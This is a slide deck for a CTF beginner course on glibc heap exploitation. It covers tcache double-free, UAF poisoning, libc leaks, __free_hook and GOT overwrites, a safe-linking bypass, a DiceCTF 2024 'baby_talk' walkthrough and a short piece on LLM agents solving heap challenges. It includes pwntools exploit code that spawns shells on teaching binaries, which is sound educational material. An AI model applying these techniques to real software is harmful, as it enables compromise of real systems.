# Heap Pwn

### A CTF beginner's course — ~3h05

glibc tcache · double-free · UAF · unsorted-bin leak · `__free_hook`

Shared `heapnote` binary · 4 challenges · live demos

---

# Outline

- **Part I — Concepts** (0:00–1:30) — heap layout, chunks, bins, tcache; env setup
  - 0:00–0:45 concepts (glibc 2.27)
  - 0:45–1:30 environment setup (pwntools, pwndbg, patchelf, pinned libcs)
- **Part II — The Challenges** (1:30–3:00) — one `heapnote` bug, four escalations
  - C1 tcache double-free -> GOT overwrite
  - C2 unsorted-bin libc leak -> `__free_hook`
  - C3 UAF-Edit poisoning -> `__free_hook` (+ one_gadget)
  - C4 safe-linking bypass (glibc 2.35, stretch)
  - `baby_talk` (DiceCTF 2024) — real-CTF capstone, `strtok` overlap → `__free_hook`
  - *1:30–2:00 C1+C2 · 2:00–2:30 C3+C4 · 2:30–3:00 baby_talk*
- **Part III — Agentic pwn heap** (3:00–3:05) — driving an LLM agent with a binary-analysis MCP

---


# Part I — Concepts

Heap layout, chunks, bins, and tcache

---

## Overview & map

---

## What is heap pwn?

- "Heap pwn" = abusing the dynamic memory allocator (glibc `malloc`/`free`) to turn memory-safety bugs into code execution.
- Unlike stack pwn (overwriting return addresses), heap exploits corrupt the allocator's own bookkeeping to get **arbitrary read / arbitrary write / code-execution primitives**.

---

## How C1–C4 fit together (the map)

Not a difficulty ladder — **two axes** you stack. Each C adds (or swaps) one thing, not all of them:

| | write primitive (A) | info needed (B) | libc | finisher |
|---|---|---|---|---|
| **C1** | double-free (A→A) | none (no-PIE) | 2.27 | GOT overwrite |
| **C2** | double-free *(reuse C1)* | + libc leak | 2.27 | `__free_hook` |
| **C3** | UAF-Edit *(swap A)* | libc leak *(reuse C2)* | 2.27 | `__free_hook` |
| **C4** | UAF-Edit + safe-linking | + heap-page leak | 2.35 | GOT overwrite (hooks gone) |

- **C1→C2:** add a leak. The write is byte-for-byte C1's double-free.
- **C2→C3:** swap the write vector (double-free→UAF). Same leak, same target. Not harder — more portable (survives the 2.29 tcache key).
- **C3→C4:** switch to 2.35. Two new walls (encrypted fd, no `__free_hook`); reuse C3's UAF, add a heap-page leak, fall back to C1's GOT overwrite. C4 = recombine C1+C3 against a modern target.

Three flat steps on 2.27, then the 2.35 stretch.

---

## The shared binary

One `heapnote` program (Add / Delete / Edit / Show). **One bug**: `delete()` never sets `notes[i] = NULL`. That single line gives us both **double-free** and **use-after-free** — exploited four different ways.

---

## Reference modules (pwn.college)

- Beginner backbone: [Dynamic Allocator Misuse](https://pwn.college/program-security/dynamic-allocator-misuse) — UAF, tcache metadata, safe-linking, overlapping allocations.
- "What's next": [Dynamic Allocator Exploitation](https://pwn.college/software-exploitation/dynamic-allocator-exploitation) — glibc 2.35, consolidation, advanced heap exploits (how2heap reference).

---

## Heap Space Layout & Chunks

---

## The heap in one picture

```
   low addr                                                       high addr
   +---------------------------------------------------------------+
   | chunk | chunk | chunk | ...        ... |        top chunk      |
   +---------------------------------------------------------------+
   ^heap_base                                       ^brk (grows up)
```
- The heap is a contiguous region grown via `brk` (small allocs) or `mmap` (large allocs, > `mp_.mmap_threshold` ≈ 128 KB).
- Allocations are carved out of this region; frees return space to the allocator's **bins**, not to the OS immediately.

---

## A malloc chunk (x86-64, glibc)

**In use:**
```
      prev_size (8)   <- reused as data of the PREVIOUS chunk when it's in use
      size      (8)   <- chunk size | flags (A|M|P in the low 3 bits)
      user data  ...  <- what malloc() returns (chunk + 0x10)
```
**Freed — the user-data area is reused as the allocator's linked-list pointers** (offsets from chunk start; from malloc's returned ptr, subtract 0x10):
```
      +0x10  fd              <- every freed chunk: next chunk in this bin
      +0x18  bk              <- unsorted / small / large: prev chunk (or &main_arena.bins[i])
      +0x20  fd_nextsize     <- large bin only: next chunk of a DIFFERENT (larger) size
      +0x28  bk_nextsize     <- large bin only: prev chunk of a different size
```
- tcache & fastbin use only `fd` (singly-linked). unsorted & small bins use `fd`+`bk`. **large bins** (chunk ≥ 0x400) add `fd_nextsize`/`bk_nextsize` to skip across different sizes without walking every chunk in the bin.
- `malloc(n)` returns `chunk + 0x10`; the 0x10 header is `prev_size` + `size`.
- Minimum chunk size **0x20** — exactly `prev_size`+`size`+`fd`+`bk`; that's *why* 0x20 is the floor (a freed chunk must hold fd+bk). Alignment 0x10.
- Flags: **P** = previous chunk in use, **M** = mmap'd, **A** = non-main arena.
- **This reuse is the whole game:** read/write a freed chunk's user data = read/write the allocator's list pointers (`fd`/`bk`). Every exploit in this course is some flavor of corrupting these pointers.

---

## The bins (where freed chunks live)

| Bin | Holds | Size range |
|---|---|---|
| **tcache** | thread-local cache, singly-linked | 0x20–0x410 (per size) |
| **fastbin** | singly-linked, LIFO | 0x20–0x80 (default) |
| **unsorted bin** | doubly-linked, FIFO | any (overflow/triage) |
| **small bin** | doubly-linked, size-indexed | 0x20–0x3f0 |
| **large bin** | doubly-linked, size-ranged | >= 0x400 |

Key idea: a freed chunk's **fd/bk pointers are stored in the chunk's user data area**. That is the whole game — if you can read or write a freed chunk's data, you are reading/writing the allocator's linked-list pointers.

---

## See it live (pwndbg)

```
gdb ./heapnote
pwndbg> break main
pwndbg> run
pwndbg> heap            # list all chunks
pwndbg> vis_heap_chunks # ascii map of the heap
```

---

## tcache (the beginner's whole game)

---

## What tcache is

- **Thread-local caching layer** added in glibc 2.26.
- Each thread has a `tcache_perthread_struct` with:
  - `counts[64]`  — how many chunks per bin
  - `entries[64]` — head pointer of each bin's singly-linked list
- 64 bins, bin `i` holds chunk size `0x20 + i*0x10`. So the **largest tcache chunk is 0x410** (request up to 0x408). Anything bigger skips tcache.

---

## The freed-chunk layout in tcache

```
      prev_size | size | fd(next)   <-  fd is in the user-data area!
```
- On free, glibc writes `chunk->fd = tcache->entries[idx]` and `tcache->entries[idx] = chunk`. LIFO stack.
- `counts[idx]++`. On malloc, pop the head, `counts[idx]--`.

---

## Why 2.27 is the easy mode

- **No tcache key** (added in 2.29): freeing the same chunk twice just makes `fd` point at itself — a **self-loop**. No check fires.
- **No safe-linking** (added in 2.32): `fd` is the raw next pointer, not obfuscated.
- `tcache_get()` does **not** check the chunk size — so a poisoned `fd` can point **anywhere** (GOT, BSS, libc) and malloc returns it verbatim. This is the primitive behind C1, C2, C3.

---

## The two bugs we exploit (both from the ONE missing `NULL`)

1. **Double-free**: `del(0); del(0)` — same chunk in the list twice.
2. **Use-after-free**: `del(0); edit(0, ...)` — write a freed chunk's `fd`; `del(0); show(0)` — read a freed chunk's `fd` (leak).

---

## See it live (pwndbg)

```
pwndbg> tcache            # the tcache_perthread_struct + each bin (all sizes)
pwndbg> bins              # all bins incl. unsorted
pwndbg> heap              # list all chunks (table)
pwndbg> vis_heap_chunks   # ASCII map of the heap
```

---

## Pwn Environment Setup

---

## The toolchain (all local — no Docker)

| Tool | Install | Use |
|---|---|---|
| **pwntools** | `pip install --user pwntools` | exploit scripting, `process()`, `p64`, `ELF` |
| **pwndbg** | `git clone https://github.com/pwndbg/pwndbg && ./setup.sh` | GDB plugin: `heap`, `bins`, `tcache`, `vis_heap_chunks` |
| **one_gadget** | `gem install one_gadget` | find `execve("/bin/sh")` gadgets in libc |
| **seccomp-tools** | `gem install --user-install seccomp-tools` | inspect seccomp sandbox |
| **ROPgadget** | `pip install ROPgadget` | (auxiliary) ROP search |
| **patchelf** | `apt install patchelf` | bind a binary to a chosen libc/ld |
| **gcc / dpkg / curl** | `apt install build-essential dpkg curl` | compile heapnote, fetch pinned libcs |

This whole course runs on your host — no container. Students get a prebuilt `handout.zip` (binaries + pinned libcs + one `skeleton.py` per challenge) — nothing to fetch or build. The instructor builds the binaries once beforehand with `make setup && make all` (source repo only, not in the handout).

---

## pwndbg heap commands (memorize these)

```
heap                 # list all chunks (table)
vis_heap_chunks      # ASCII map (the most useful one)
bins                 # all bins: tcache + fast + unsorted + small + large
tcache               # current thread's tcache, all per-bin lists (no size arg)
tcachebins           # tcache bins only (-v includes empty)
```

---

## The two libcs we pin (and why exactly these builds)

| Feature | 2.27 (our target) | 2.35 ("what's next") |
|---|---|---|
| tcache | yes | yes |
| tcache key (double-free detect) | **no** | yes |
| safe-linking (PROTECT_PTR) | **no** | yes |
| `__free_hook` / `__malloc_hook` | **present** | removed (2.34) |

2.27 is the cleanest teaching target: the three beginner techniques (double-free, unsorted-bin leak, UAF→`__free_hook`) all work directly. 2.35 is the realistic modern target — covered as a stretch (C4).

| Challenge | glibc | Ubuntu package | Why this build |
|---|---|---|---|
| C1–C3 | 2.27 | `libc6 2.27-3ubuntu1` (18.04 **GA**) | the original GA build has **no tcache key** → the double-free self-loop works. ⚠ Ubuntu *backported* the tcache double-free check into `2.27-3ubuntu1.2+` (e.g. `1.6`); those builds print `free(): double free detected in tcache 2` and abort. We pin the GA on purpose. |
| C4 | 2.35 | `libc6 2.35-0ubuntu3.14` (22.04) | safe-linking (PROTECT_PTR) stretch target. `__free_hook`/`__malloc_hook` were removed in 2.34. |

These are fetched as **signed `.deb` packages straight from the Ubuntu archive** (no third-party repo, no scripts): `setup.sh` downloads them with `curl` and extracts with `dpkg -x` — exactly what `apt download` does. The shipped libcs are stripped (no `libc6-dbg` fetched) — pwndbg resolves `heap` / `tcache` / `bins` via its built-in heuristics, which is enough for the live demos.

> **Switching libc is itself a teaching moment.** C1–C3 vs C4 differ only in which pinned libc the binary is bound to. The same `heapnote.c` source becomes a 2.27 target or a 2.35 target by building against a different libc.

---

## Switching libc: patchelf vs re-link (not demoed — see Makefile / setup.sh)

A binary's libc relationship has two layers; **patchelf only touches one** — runtime binding (which `ld.so` + `libc.so.6` loads, via `.interp` + `DT_RUNPATH`). The other layer, **link-time requirements** (which `GLIBC_x.y` versions the binary needs, set by `crt1.o` at link time), is read-only after link — patchelf can't remove a requirement. So a binary built on a 2.34+ host dies under 2.27 (`version GLIBC_2.34 not found`); `heapnote` is linked against a **2.27 sysroot** to avoid this.

**Daily CTF recipe:** `patchelf --set-interpreter ./glibc-2.27/ld-2.27.so --set-rpath ./glibc-2.27 ./bin`. **Gotcha:** the rpath dir needs a `libc.so.6` symlink → the real `libc-X.so`, or the loader silently falls back to your host libc (2.27-ld + 2.35-libc → crash).

Not demoed — the instructor runs `make setup && make all` once beforehand, then `pack_handout.sh`. Students just `unzip handout.zip` and run `python3 cX/skeleton.py`. Read `setup.sh` / the Makefile for the exact sysroot + patchelf flags.

---

## Stuck on a different libc version? → how2heap

glibc heap internals change across versions: tcache key (2.29), safe-linking (2.32), hook removal (2.34), ... When you face a libc you haven't exploited before, **search [how2heap](https://github.com/shellphish/how2heap)** — shellphish's canonical collection of working heap-exploit PoCs, one file per technique per glibc version. Browse the directory matching your libc version and read the corresponding `.c` to see the exact primitive (double-free, tcache poisoning, house-of-X, safe-linking bypass, ...). Every `exp.py` / `solve.py` in this course — the instructor answer keys, in the source repo, NOT in the student handout — is a hand-stripped, commented version of the matching how2heap technique. Students get a `skeleton.py` (utils + TODO blocks) per challenge.

---

## Alternative: pwn.college dojo

- The pwn.college "dojo" gives you a prebuilt VM with the exact challenge glibc and a flag-checker. Great for self-study; this course instead runs fully on your host laptop so everything is inspectable with your own pwndbg.

---

## Pre-flight checklist before any demo

```
checksec ./heapnote                       # confirm: No PIE, Partial RELRO
./glibc-2.27/ld-2.27.so --list ./heapnote # libc.so.6 => ./glibc-2.27/...
file  ./heapnote                          # x86-64, dynamically linked
# instructor sanity check (answer key, source repo -- NOT in the handout):
cd challenges && python3 c1_double_free/exp.py   # expect: shell, then cat flag.txt
# student equivalent (handout): cd handouts/challenges && python3 c1_double_free/skeleton.py
```

---

# Part II — The Challenges

One bug, four escalations · glibc 2.27 (+ 2.35 stretch)

---

## C1: tcache double-free → poisoning → GOT overwrite

**Baseline —** the core mechanic: corrupt the tcache list → arbitrary write → hijack control flow. Every later C adds (or swaps) one thing on top of this.

---

## Goal

No leak. No libc. Just the heap bug + `-no-pie`. Overwrite `free@GOT` with `&win`, then call `free` → shell.

---

## The bug (the whole course in one line)

```c
void del(int i){ free(notes[i]->data); free(notes[i]); /* BUG: no NULL */ }
```
`notes[i]` is never cleared → `del(0); del(0)` frees the same chunk twice.

---

## Step 1 — the double-free makes a self-loop

On 2.27 (no tcache key), freeing chunk A twice:
```
free A :  head -> A           (A->fd = NULL)
free A :  head -> A -> A ...  (A->fd = A)   counts = 2
```

---

## Step 2 — poison the fd

`malloc` #1 returns A. We write `&free@GOT` into A's data — which **is** A's `fd`. Now the list is `head -> A -> &free@GOT`.

---

## Step 3 — the 3-malloc rule

```
malloc #1 : returns A          -> write &free@GOT into A (poison fd)
malloc #2 : returns A again     -> dummy (drains the self-loop)
                                head now = &free@GOT
malloc #3 : returns &free@GOT  -> write &win there
```
Why #2 returns A again: after #1, `head` still pointed at A (it was set to `A->fd = A` *before* we returned A and edited it). The poisoned `fd` only takes effect for #3.

---

## Step 4 — trigger

`del(any live note)` → `free()` PLT → GOT → `win()` → `system("/bin/sh")`.

---

## Live demo

Live-coding from the handout (instructor fills the `TODO` blocks in `skeleton.py` on screen):

```
cd handouts/challenges && python3 c1_double_free/skeleton.py          # run your exploit
cd handouts/challenges && python3 c1_double_free/skeleton.py --demo   # pwndbg in a tmux split
$ cat flag.txt
```

(`exp.py` in the source repo is the instructor answer key — not in the handout.)

---

## pwndbg view (what to show on screen)

```
pwndbg> tcache          # before: 0x30 bin has counts=2, A->A self-loop
pwndbg> tcache          # after malloc #1: A-> &free@GOT
pwndbg> got             # after malloc #3: free -> win
```

---

## Takeaways

- Double-free = a corrupted linked list you control.
- `tcache_get` does **not** check chunk size → poisoned fd → arbitrary write.
- `-no-pie` makes GOT/win addresses static → no leak needed.

---

## C2: unsorted bin libc leak → `__free_hook` → system

**From C1:** add a libc leak. The write is byte-for-byte C1's double-free — only the target changes (`free@GOT` → `__free_hook`).

---

## Goal

Defeat ASLR: leak libc base, then overwrite `__free_hook` with `system` and `free("/bin/sh")`.

---

## Step 1 — get a chunk OUT of tcache

tcache only holds sizes 0x20–0x410. Request **0x418** → 0x420 chunk → tcache won't take it. On `free`, it lands in the **unsorted bin**.
```
add(0, 0x418, ...)   # 0x420 chunk
add(1, 0x18, ...)    # GUARD so chunk 0 does not merge into top
del(0)               # -> unsorted bin
```

---

## Step 2 — the leak

A freed unsorted-bin chunk's `fd`/`bk` point at the bin head. On 2.27 x86-64 that address is **`main_arena + 96`**.
- `main_arena = __malloc_hook + 0x10`
- → `libc_base = leak − (main_arena + 96)`

UAF-read it: `show(0)` prints the freed chunk's data (its `fd`).
```python
leak = u64(show(0)[:8])
libc.address = leak - (libc.symbols['__malloc_hook'] + 0x10) - 96
```
All offsets read from the shipped libc at runtime → robust to 2.27 sub-version differences.

---

## Step 3 — tcache poisoning (reuse C1's double-free + 3-malloc)

Same primitive as C1 — only the target changes (`free@GOT` → `__free_hook`). No `edit` needed; this is pure double-free + 3-malloc, exactly like C1:
```
add(2,0x68,"X"); del(2); del(2)          # double-free: 0x70 bin A->A, counts=2
add(3,0x68, p64(__free_hook))            # malloc #1 = A; write __free_hook into A->fd
add(4,0x68,"DUMMY")                      # malloc #2 = A again (drain self-loop); head=__free_hook
add(5,0x68, p64(system))                 # malloc #3 = __free_hook; write system
```
After malloc #3 pops `__free_hook`, `entries = *(__free_hook) = 0` → the 0x70 bin is left EMPTY, so the next `/bin/sh` malloc comes fresh from top (no poisoned-bin crash) — Step 4 is unaffected.

---

## Step 4 — trigger

```
add(6, 0x68, "/bin/sh\0")
del(6)                  # free(ptr) -> __free_hook(ptr) -> system("/bin/sh")
```
`__libc_free` calls `hook(ptr, caller)` (2 args); `system` reads only `rdi` → the extra `rsi` is harmless.

---

## Live demo

Live-coding from the handout (`skeleton.py`):

```
cd handouts/challenges && python3 c2_unsorted_leak/skeleton.py
$ cat flag.txt
```

---

## pwndbg view

```
pwndbg> bins          # note the 0x420 chunk in the unsorted bin
pwndbg> bins          # after poisoning: 0x70 tcache bin -> __free_hook
pwndbg> p &__free_hook # confirm value == system
```

---

## Takeaways

- Size > tcache max → unsorted bin → libc pointer leak.
- `main_arena+96` is the canonical 2.27 leak target.
- `__free_hook` = the cleanest 2.27 hijack target (gone in 2.34).

---

## C3: UAF-Edit poisoning → `__free_hook` (+ one_gadget)

**From C2:** swap the write vector (double-free → UAF-Edit). Same leak, same target. Not harder — more portable (survives the 2.29 tcache key).

---

## Same goal as C2, better primitive

C2 reused the **double-free** to poison. C3 does it with a **single** use-after-free + Edit — no double-free at all.

---

## Why this matters

- 2.29 added a **tcache key** that detects double-frees. The C1/C2 vector trips it on modern glibc.
- UAF-Edit only frees **once**, then edits the dangling pointer → **no double-free signature**. This generalizes to 2.29+ (and, with safe-linking handling, to 2.32+ — see C4).

---

## The count rule (the one subtlety)

`tcache_get` requires `counts[idx] > 0`. To pop victim-then-target we need `counts >= 2`. So we free **two distinct** chunks (not the same one twice):
```
add(2,0x68); add(3,0x68); del(3); del(2)   # head=2->3, counts=2, NO double-free
edit(2, 8, p64(__free_hook))              # UAF: head's fd -> __free_hook
add(4,0x68,"PAD")                         # malloc #1 = chunk-2
add(5,0x68, p64(system))                  # malloc #2 = __free_hook
```
Then `add(6,0x68,"/bin/sh\0"); del(6)` → shell.

---

## one_gadget alternative

Instead of `system` + `"/bin/sh"`, write a single `execve("/bin/sh")` gadget into `__free_hook` (or `__malloc_hook`):
```bash
one_gadget glibc-2.27/libc-2.27.so
# 0x4f2c5  [rsp+0x40]  == NULL
# 0x4f322  [rsp+0x40]  == NULL
# 0x10a38c [rsp+0x70] == NULL
```
- Pros: no need to place `"/bin/sh"` anywhere.
- Cons: **constraint-dependent** — the gadget only fires if the named stack slot is NULL at trigger time. The instructor must pre-test which gadget works from the menu's call path. `system`+`"/bin/sh"` is the reliable default; one_gadget is the "fancy alternative".

In the instructor answer key `exp.py`, run with `--one-gadget` (`python3 c3_uaf_poison/exp.py --one-gadget`) — the `skeleton.py` in the handout is utils-only; the one-gadget path is a pre-tested `exp.py` extra.

---

## Live demo

Live-coding from the handout (`skeleton.py`):

```
cd handouts/challenges && python3 c3_uaf_poison/skeleton.py
$ cat flag.txt
```

---

## Takeaways

- UAF-Edit subsumes double-free for poisoning, with fewer detection risks.
- The tcache `counts` field is the gating constraint — plan your frees.
- one_gadget = powerful but flaky; always pre-test in-context.

---

## C4 (stretch): safe-linking bypass on glibc 2.35

**From C3:** switch to 2.35. Two new walls (encrypted fd, no `__free_hook`); reuse C3's UAF, add a heap-page leak, fall back to C1's GOT overwrite.

---

## What changed at 2.32

glibc added **safe-linking** (PROTECT_PTR). The tcache `fd` is no longer the raw next pointer:
```
stored_fd = PROTECT_PTR(&fd_slot, next)
          = (&fd_slot >> 12) XOR next
```
where `&fd_slot` is the address of the `fd` field (the chunk's user data).

To poison `fd` to point at a target `T`, you must now write:
```
(&fd_slot >> 12) XOR T
```
…which requires knowing `&fd_slot >> 12` — i.e. a **heap-page leak**.

---

## What changed at 2.34 (the bigger wall)

`__free_hook` and `__malloc_hook` were **removed**. The C2/C3 finisher is gone. Modern targets include: the tcache `perthread_struct` key/count, `__exit_funcs` / TLS `dtor_list`, `__printf_function_table`, IO_FILE vtables (`FSOP`). All are materially harder than a hook overwrite.

---

## The heap-page leak (the easy part of C4)

If a chunk is the **only** entry in a tcache bin, its real `next` is NULL, so `stored_fd = (&fd >> 12) XOR 0 = &fd >> 12`. A UAF-read leaks exactly the value we need:
```python
del(2)                    # only entry in its bin
prot_fd = u64(show(2)[:8])
heap_page = prot_fd        # == &fd >> 12
```

---

## Forging a protected pointer

```python
def protect_ptr(fd_slot_addr, target):
    return (fd_slot_addr >> 12) ^ target

forged = protect_ptr(fd_slot_addr, target)
edit(chunk, 8, p64(forged))   # the next malloc returns `target`
```

---

## This stretch challenge's scope

Hooks are gone on 2.35, so the C2/C3 one-shot finisher doesn't exist. But heapnote is -no-pie + partial RELRO (writable GOT), so we reuse C1's finisher — GOT overwrite — on top of the safe-linking bypass and DO get a shell:

1. heap-page leak via a singly-freed tcache chunk (defeats safe-linking),
2. forge fd = PROTECT_PTR(&fd, puts@GOT) → malloc returns puts@GOT → write &win → next menu() puts() → win() → system("/bin/sh").

One 2.34+ subtlety: `tcache_get()` zeroes `returned_ptr+8` (`e->key=0`), so we target `puts@GOT` (its +8 neighbour `write@GOT` is never called in the menu path), not `free@GOT` (whose +8 is `puts@GOT`, which `menu()` would call and crash). `win()` uses `system@GOT`, which we leave untouched, so it still fires.

Honest framing: this is a shell because heapnote hands us a writable GOT. A real 2.35 target (full RELRO, no `win()`) needs the structural finishers — FSOP / **House of Apple** (fake an `_IO_FILE` + a vtable inside the validated range), `exit_funcs` / TLS `dtor_list` (gated by `PTR_MANGLE` → also leak the pointer guard), `__printf_function_table` (House of Husk). That's the "what's next".

---

## Live demo

Live-coding from the handout (`skeleton.py`):

```
cd handouts/challenges && python3 c4_safe_linking/skeleton.py
```
(watch the heap-page leak, the PROTECT_PTR'd fd → `puts@GOT`, then the GOT overwrite — the next `menu()` `puts()` pops a shell; `cat flag.txt`)

---

## Where to go next

- pwn.college [Dynamic Allocator Exploitation](https://pwn.college/software-exploitation/dynamic-allocator-exploitation) (glibc 2.35, consolidation, advanced primitives).
- [how2heap](https://github.com/shellphish/how2heap) — `safe_linking.c`, `tcache_stashing_unlink.c`, `house of *` variants.
- Practice: re-do C1–C3 on a 2.31, then 2.35 build, adapting each step.

---

## Takeaways

- Safe-linking adds a heap-leak dependency, not an impassable wall.
- Hook removal (2.34) kills the one-shot finisher: with a writable GOT you fall back to C1-style GOT overwrite; with full RELRO you need FSOP / House of Apple / exit_funcs (structural, sometimes a pointer-guard leak).
- Leaking heap + libc is now step 0 of any modern tcache exploit.

---

## Real CTF: `baby_talk` (DiceCTF 2024) — 30 min

A real, in-the-wild challenge that chains the exact techniques from C1–C3. This is the "put it together" capstone before the agentic stretch.

Source / files: `challenges/baby_talk/` (`binary`, `libc.so.6`, `ld-linux-x86-64.so.2`, `flag.txt`, `solve.py`). Upstream: [dicegang/dicectf-quals-2024-challenges/pwn/baby-talk](https://github.com/dicegang/dicectf-quals-2024-challenges/tree/main/pwn/baby-talk).

---

## Segment plan (30 min)

- **0–10 min — students read** the challenge cold. Open `binary` in pwndbg, run it, map the three menu ops (`str` / `tok` / `del`), find the bug themselves. No hand-holding — this is the transfer test.
- **10–30 min — walkthrough + live PoC**: the bug, the leak chain, the overlap trick, the `__free_hook` finish, then live-code `baby_talk/skeleton.py` (handout).

---

## The binary

Full RELRO, PIE, canary, NX. glibc 2.27-3ubuntu1.6 (shipped). Menu (verified in asm; `str` returns the **slot index**, not the address):

```
1. str  — slot=get_empty(); p=malloc(size); strs[slot]=p; read(0,p,size)
          (raw read, NO null terminator); printf("stored at %d!", slot)
2. tok  — strtok(strs[idx], delim); print each token with puts
3. del  — free(strs[idx]); strs[idx]=NULL   ← clean (nulled; NOT a UAF)
4. exit
```

**The bug is `str`, not `del`.** `del` nulls the pointer (asm: `call free@plt` then `movq $0x0,(strs+idx*8)`) → **no UAF, no double-free** — unlike `heapnote`. The bug: `str` fills the chunk with `read(0,p,size)` and **never writes a `\0`**. `tok` then `strtok`s this non-terminated buffer, so it scans **past the user data into the next chunk's header** until `\0` or the delimiter — and writes `\0` over every delimiter byte **in place**. Aim the delimiter at a byte *inside a neighbour's size field* → a targeted null-byte corruption of chunk metadata, with no overflow. One primitive, one parser.

---

## How it maps to C1–C3 (the whole point of this slot)

`baby_talk` is **C2 + C3 with a new fd-corruption vector**: the `strtok` null-byte overlap **replaces** C1's double-free. Full RELRO also kills the GOT route, so `__free_hook` is the mandatory target.

| heapnote chapter | `baby_talk` does the same idea... |
|---|---|
| **C1** double-free → poison a tcache fd | **replaced**: `strtok` `\0` → backward consolidation → overlapping chunk → overwrite a live tcache fd. No double-free (and 2.27-1.6 has the tcache key anyway). |
| **C2** unsorted-bin libc leak | reuse a freed 0xf8 chunk; `malloc` does not zero it, so the old tcache/unsorted fd survives in the data; `tok`+`puts` reads it out |
| **C3** `__free_hook` + `system("/bin/sh")` | same finisher: poison the 0x20 tcache fd → `__free_hook`, write `system`, free a `"/bin/sh"` chunk |
| **C4** safe-linking | not here — 2.27 has a bare fd, no PROTECT_PTR (the easy-mode counterpart) |

Full RELRO is why this is the realistic mirror of C1's partial-RELRO GOT overwrite: no writable GOT → the libc hook is the target.

---

## Leak — heap + libc (residual fd, NOT a UAF)

Prime the 0x100 class: alloc 9 × 0xf8, free all 9. 7 fill the 0x100 tcache (fd = heap ptrs); the overflow (tcache full) lands in the unsorted bin (fd/bk = `main_arena+96`, a libc ptr). Re-alloc 9 × 0xf8 sending a 1-byte `"A"` each time — `read` fills 1 byte, `malloc` does **not** zero the rest, so each chunk keeps its old fd. Then `tok`+`puts` prints the residual bytes:
- slot 0 (tcache-origin) → heap fd → `heap_base` (page-aligned).
- slot 7 (unsorted-origin) → libc fd → `libc.address = leak - 0x3EBE41`.

No dangling pointer is read — `del` nulled the table; the chunks are legitimately re-allocated. The leak is "malloc never clears reused memory."

## Overlap — the `strtok` null-byte trick

```
# prime the 0x100 tcache so later frees/allocs are LIFO-controlled
str(0xf8, "a"*0xf8)                 # slot 9, packed full of 'a' (no '\0')
str(0xf8, "b"); str(0xf8, "x")      # slots 10, 11
tok(9, "\x01")                      # no '\0' in 'a'*0xf8 -> strtok runs into slot 10's
                                    # header; slot 10 size 0x101, low byte 0x01 == delim
                                    # -> '\0' written there; 0x101 -> 0x100: PREV_INUSE
                                    # cleared ("prev chunk is free")
# reclaim slot 9, sculpt a fake FREE 0xE0 chunk inside it (fd/bk/nextsize
# point into the heap so consolidation links validate; trailing 0xE0 prev_size),
# then free it so the fake chunk is a real unsorted-bin entry:
del(9); str(0xf8, <fake 0xE0 chunk>); del(9)
del(10)                             # P clear -> backward consolidation merges slot 10
                                    # into the fake chunk -> OVERLAPS live slot 11
```

One `strtok` `\0` turns a size field into "prev is free"; the sculpted fake prev chunk makes consolidation produce an overlapping allocation.

## Finish — poison the 0x20 tcache fd → `__free_hook`

```python
# two DISTINCT 0x18 frees -> 0x20 tcache counts=2 (the C3 count rule, NOT a double-free)
q = do_str(io, 0x18, b"Q"); do_del(io, do_str(io, 0x18, b"x")); do_del(io, q)
# the overlap writes a fake 0x21 chunk whose fd overlaps the live 0x20 tcache head:
do_str(io, 0xF8, b"X"*0x18 + p64(0x21) + p64(libc.sym["__free_hook"]))
binsh_idx = do_str(io, 0x18, b"/bin/sh")     # pop head (legit); head now = __free_hook
do_str(io, 0x18, p64(libc.sym["system"]))    # pop __free_hook; write system
do_del(io, binsh_idx)                        # free("/bin/sh") -> system("/bin/sh")
```

## Live demo

Live-coding from the handout (`baby_talk/skeleton.py` — self-contained dir, own libc + ld):

```bash
cd handouts/challenges && python3 baby_talk/skeleton.py        # pops a shell, cat flag.txt
# flag: dice{tkjctf_lmeow_fee9c2ee3952d7b9479306ddd8e477ca}
```

(`solve.py` in the source repo is the instructor answer key — not in the handout.) Verified locally against the shipped `libc.so.6` + `ld`, no Docker.

---

## Takeaways

- `baby_talk` = **C2 (leak) + C3 (`__free_hook`) + a new fd-corruption vector** (the `strtok` null-byte overlap) that replaces C1's double-free — not "C1+C2+C3 plus a trick." The overlap substitutes for the double-free, and Full RELRO is why the hook (not the GOT) is the target.
- `del` nulled the pointer; the leak reads **residual fd in re-allocated chunks**, not a UAF. "Malloc never clears reused memory" is the leak primitive.
- The leak-then-poison-then-hook skeleton is *the* heap pwn template; most beginner/intermediate 2.27 challenges are this shape with a different write vector.
- When the binary has no overflow but a destructive parser (`strtok`, `memcpy` with user len, etc.) acting on a **non-null-terminated buffer**, the parser *is* the write primitive.

---

# Part III — Agentic Pwn

Driving an LLM agent to do heap pwn

---

## Agentic Pwn Heap (5 min intro)

> **Presenter note:** 5-minute teaser, not a lecture. Cover *The pitch* + *The loop that works*; the rest is a one-slide "where to go next" pointer.

---

## The pitch

Can an LLM agent actually *solve* a heap pwn challenge? In 2024–2026 the answer moved from "no" to "sometimes, with the right loop." This segment is a 5-minute tour of the frontier.

---

## The loop that works

```
        +--------------------+
        |  agent (Claude)    |
        +--------------------+
   read |                    | send actions
  binary|  binary-analysis   | (run binary, gdb, pwntools)
  xrefs |  MCP + gdb/pwntools|
        +--------------------+
                ^
                | feed pwndbg output (heap/bins/tcache) back as context
                |
        +--------------------+
        |   target binary    |
        +--------------------+
```
The agent never "sees" memory directly. It reasons from **decompiled code** (MCP) and **debugger output** (fed back into context), then emits the next pwntools action. Heap pwn is hard for agents because the state is large and invisible without the right `pwndbg` dumps at each step.

---

## Where to go next

- **Lineage (pre-LLM AEG):** symbolic execution + constraint solving to auto-find bugs and synthesize exploits — AEG (NDSS'11), Mayhem (won 2016 DARPA CGC), HeapHopper (heap BMC), MAZE / SCATTER / BAGUA (heap grooming).
- **Agentic frontier (2024+):** LLM agents that *reason* about the heap instead of solving it — [ExploitGym](https://www.cybergym.io/exploitgym/) (breadth / CVE benchmark), [ExploitBench](https://exploitbench.ai/) (depth / V8), DARPA AIxCC (find + patch CVEs).
- **For beginners:** use the agentic loop as a *tutor* (explain my exploit, suggest next steps) before an autonomous solver.

---

# Thank you

Slides + challenges + answer keys (`exp.py` / `solve.py`) in the repo. Students get `handout.zip` (binaries + `skeleton.py` per challenge).

Reference: [pwn.college](https://pwn.college) · [how2heap](https://github.com/shellphish/how2heap)
